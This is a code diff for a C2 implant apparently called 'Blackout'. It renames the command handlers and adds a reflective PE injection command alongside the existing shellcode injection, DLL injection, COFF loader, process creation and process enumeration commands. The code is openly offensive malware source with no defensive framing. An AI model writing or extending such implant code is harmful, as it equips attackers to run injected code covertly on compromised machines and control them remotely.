@@ -6,17 +6,18 @@ FUNC VOID CommandDispatcher(
 ) {
     BLACKOUT_INSTANCE
 
-    Instance()->Commands[ 0  ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
-    Instance()->Commands[ 1  ] = { .ID = COMMAND_MEMORY,   .Function = CommandMemory };
+    Instance()->Commands[ 0  ] = { .ID = BLACKOUT_CHECKIN, .Function = CmdCheckin };
+    Instance()->Commands[ 1  ] = { .ID = COMMAND_MEMORY,   .Function = CmdMemory };
     Instance()->Commands[ 2  ] = { .ID = COMMAND_RUN,      .Function = CmdRun };
     Instance()->Commands[ 3  ] = { .ID = COMMAND_EXPLORER, .Function = CmdExplorer };
-    Instance()->Commands[ 4  ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
-    Instance()->Commands[ 5  ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
-    Instance()->Commands[ 6  ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
-    Instance()->Commands[ 7  ] = { .ID = COMMAND_CLASSIC,  .Function = CommandInjectionClassic };
-    Instance()->Commands[ 8  ] = { .ID = COMMAND_PROCLIST, .Function = CommandProcEnum };
+    Instance()->Commands[ 4  ] = { .ID = COMMAND_SLEEP,    .Function = CmdSleep };
+    Instance()->Commands[ 5  ] = { .ID = COMMAND_EXITP,    .Function = CmdExitProcess };
+    Instance()->Commands[ 6  ] = { .ID = COMMAND_EXITT,    .Function = CmdExitThread };
+    Instance()->Commands[ 7  ] = { .ID = COMMAND_CLASSIC,  .Function = CmdInjectionClassic };
+    Instance()->Commands[ 8  ] = { .ID = COMMAND_PROCLIST, .Function = CmdProcEnum };
     Instance()->Commands[ 9  ] = { .ID = CMD_COFFLOADER,   .Function = CmdCoffLoader };
     Instance()->Commands[ 10 ] = { .ID = CMD_DLLINJECTION, .Function = CmdDllInjection }; 
+    Instance()->Commands[ 11 ] = { .ID = CMD_REFLECTION,   .Function = CmdReflectiveInjection };
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -41,7 +42,6 @@ FUNC VOID CommandDispatcher(
             do
             {   
                 TaskCommand = ParserGetInt32( &Parser );
-
                 if ( TaskCommand != COMMAND_NO_JOB )
                 {
                     BK_PRINT( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
@@ -65,7 +65,7 @@ FUNC VOID CommandDispatcher(
 
             } while ( Parser.Length > 4 );
 
-            //bkHeapFree( DataBuffer, DataSize );
+            Instance()->Win32.LocalFree( DataBuffer );
             DataBuffer = NULL;
 
             ParserDestroy( &Parser );
@@ -78,10 +78,11 @@ FUNC VOID CommandDispatcher(
 
     } while ( TRUE );
 
+    Instance()->Win32.LocalFree( DataBuffer );
     Instance()->Session.Connected = FALSE;
 }
 
-FUNC VOID CommandInjectionClassic(
+FUNC VOID CmdInjectionClassic(
     PPARSER Parser
 ) {
     BK_PACKAGE = PackageCreate( COMMAND_CLASSIC );
@@ -89,8 +90,6 @@ FUNC VOID CommandInjectionClassic(
     DWORD  bkErrorCode = 0;
     HANDLE ProcessHandle  = NULL;
     DWORD  ProcessId      = ParserGetInt32( Parser );
-        BK_PRINT( "1 %d\n", ProcessId );
-
     DWORD  RegionSize     = 0;
     PVOID  MemAllocated   = NULL;
     PBYTE  ShellcodeBytes = ParserGetBytes( Parser, &RegionSize );
@@ -131,7 +130,7 @@ _Leave:
     PackageTransmit( BK_PACKAGE, NULL, NULL );    
 }
 
-FUNC VOID CommandMemory(
+FUNC VOID CmdMemory(
     _In_ PPARSER Parser
 ) {    
     M_MEM MemOp = ParserGetInt32( Parser );
@@ -189,7 +188,9 @@ FUNC VOID CmdRun(
     HANDLE   ThreadHandle  = NULL;
     BOOL     bCheck        = FALSE;
 
-    bCheck = bkProcessCreate( ProcCmd, FALSE, CREATE_NO_WINDOW, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
+    Blackout().Fork.Blockdlls = TRUE;
+
+    bCheck = bkProcessCreate( ProcCmd, FALSE, CREATE_NEW_CONSOLE, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
     if ( !bCheck )
         return;
 
@@ -226,14 +227,24 @@ FUNC VOID CmdExplorer(
         if ( !bCheck )
             PackageTransmitError( NtLastError() );
         
-        PackageAddInt32( BK_PACKAGE, PWD );
+        PackageAddInt32(  BK_PACKAGE, PWD );
         PackageAddString( BK_PACKAGE, CurDir );
-        PackageTransmit( BK_PACKAGE, NULL, NULL );
+        PackageTransmit(  BK_PACKAGE, NULL, NULL );
     }
     
     default:
         break;
     }
+}
+
+FUNC VOID CmdReflectiveInjection(
+    PPARSER Parser
+) {
+    UINT32 PeSize  = 0;
+    PBYTE  PeBytes = ParserGetBytes( Parser, &PeSize );
+    PSTR   PeArgs  = ParserGetString( Parser, 0 );
+
+    InjectionReflective( NtCurrentProcess(), PeBytes, PeSize, PeArgs, TRUE );
 }
 
 FUNC VOID CmdDllInjection(
@@ -285,7 +296,7 @@ FUNC VOID CmdCoffLoader(
     return;
 }
 
-FUNC VOID CommandProcEnum(
+FUNC VOID CmdProcEnum(
     _In_ PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
@@ -351,7 +362,7 @@ FUNC VOID CommandProcEnum(
     PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
 
-FUNC VOID CommandCheckin(
+FUNC VOID CmdCheckin(
     _In_ PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
@@ -451,7 +462,7 @@ FUNC VOID CommandToken(
 
 }
 
-FUNC VOID CommandSleep(
+FUNC VOID CmdSleep(
     PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
@@ -466,7 +477,7 @@ FUNC VOID CommandSleep(
     PackageTransmit( BK_PACKAGE, NULL, NULL ); 
 }
 
-FUNC VOID CommandExitProcess(
+FUNC VOID CmdExitProcess(
     PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
@@ -476,7 +487,7 @@ FUNC VOID CommandExitProcess(
     Instance()->Win32.RtlExitUserProcess( 0 );
 }
 
-FUNC VOID CommandExitThread(
+FUNC VOID CmdExitThread(
     PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
